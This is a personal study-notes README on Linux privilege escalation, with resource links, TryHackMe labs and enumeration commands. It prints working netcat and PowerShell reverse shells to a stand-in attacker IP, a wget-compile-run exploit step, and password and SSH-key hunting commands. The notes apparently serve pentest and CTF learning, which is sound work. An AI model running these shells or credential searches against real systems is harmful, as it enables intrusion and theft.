🐧 Linux Privilege Escalation – Study Notes & Resources

This repository contains my learning notes, commands, tools, and references for Linux Enumeration and Privilege Escalation, based on labs, courses, TryHackMe rooms, and self-research.

📚 Learning Resources

Basic Linux Privilege Escalation
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

PayloadsAllTheThings – Linux PrivEsc
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

HackTricks – Linux Privilege Escalation Checklist
https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist

Sushant 747 OSCP Guide (VPN may be required)
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html

Linux PrivEsc Resources Repository
https://github.com/Gr1mmie/Linux-Privilege-Escalation-Resources

🧪 Practice Labs

TryHackMe – Linux PrivEsc Arena
https://tryhackme.com/room/linuxprivescarena

Linux PrivEsc Playground
https://tryhackme.com/room/privescplayground

TryHackMe Platform
https://tryhackme.com/

📄 Cheat Sheets

User Enumeration Cheat Sheet
https://github.com/Shiva108/CTF-notes/blob/master/Notes%20VA/Local%20Linux%20Enumeration%20n%20Privilege%20Escalation%20Cheatsheet%20.txt

Linux Enumeration Cheat Sheet
https://cyberlab.pacific.edu/resources/linux-enumeration-cheat-sheet

🔍 Password & Credential Hunting
grep --color=auto -rwn '/' -ie "PASSWORD" 2>/dev/null
locate password | more
grep --color=auto -rwn '/' -ie "PASS=" 2>/dev/null

SSH Key Hunting
find / -name id_rsa 2>/dev/null

🤖 Automated Enumeration Tools

LinPEAS
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

LinEnum
https://github.com/rebootuser/LinEnum

Linux Exploit Suggester (LES)
https://github.com/mzet-/linux-exploit-suggester

Linux Priv Checker
https://github.com/linted/linuxprivchecker

🧠 What is the Linux Kernel?

The kernel is:

The core of the operating system

Controls hardware and system resources

Acts as a bridge between hardware and software

Kernel Exploit Resources

https://github.com/lucyoa/kernel-exploits

🔓 GTFOBins

GTFOBins is a curated list of Unix binaries that can be abused to bypass security restrictions on misconfigured systems.

🔗 https://gtfobins.github.io/

🔁 Reverse Shell Payloads
Netcat (Listener on Attacker)
nc -lvnp <PORT>

Reverse Shell (Victim)
mkfifo /tmp/f; nc <ATTACKER-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

Upgrade Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo
fg
export TERM=xterm

🪟 PowerShell Reverse Shell (Windows)
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback = (iex $data 2>&1 | Out-String );
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};
$client.Close()"

💣 MSFVENOM Basics
msfvenom -p <PAYLOAD> <OPTIONS>

Payload Naming Convention
<OS>/<arch>/<payload>


Examples:

linux/x86/shell_reverse_tcp

windows/x64/meterpreter/reverse_tcp

Staged vs Stageless

Staged: Small loader → pulls payload from handler

Stageless: Single payload, larger, easier to detect

🔍 Enumeration (Post-Exploitation)
System Info
hostname
uname -a
cat /proc/version
cat /etc/issue
lsb_release -a

Processes & Environment
ps aux
env
sudo -l

Users
id
cat /etc/passwd | grep home
history

Networking
ifconfig
ip route
netstat -ano

🔎 find Command (Very Important)
SUID Files
find / -perm -u=s -type f 2>/dev/null

Writable Directories
find / -writable -type d 2>/dev/null

Large / Recent Files
find / -size +100M 2>/dev/null
find / -mtime -10 2>/dev/null

🧬 Kernel Privilege Escalation Methodology

Identify kernel version

Search for public exploits

Transfer exploit to target

Compile and execute

Example
# Attacker
python3 -m http.server 8000

# Victim
cd /tmp
wget http://ATTACKER-IP:8000/exploit.c
gcc exploit.c -o exploit
./exploit


➡️ Result: root access

🔐 Privilege Escalation: SUID

SUID allows binaries to run with the owner’s privileges.

Example: Finding SUID Files
find / -type f -perm -4000 2>/dev/null


These binaries can often be abused via GTFOBins.

🎯 Final Notes

Enumeration is continuous

Privilege escalation often relies on:

Misconfigurations

Weak permissions

Kernel vulnerabilities

Always combine manual analysis + automated tools

📌 Purpose:
This repository documents my learning journey in Linux Privilege Escalation, combining Pentesting, CTF practice, and real-world methodology.
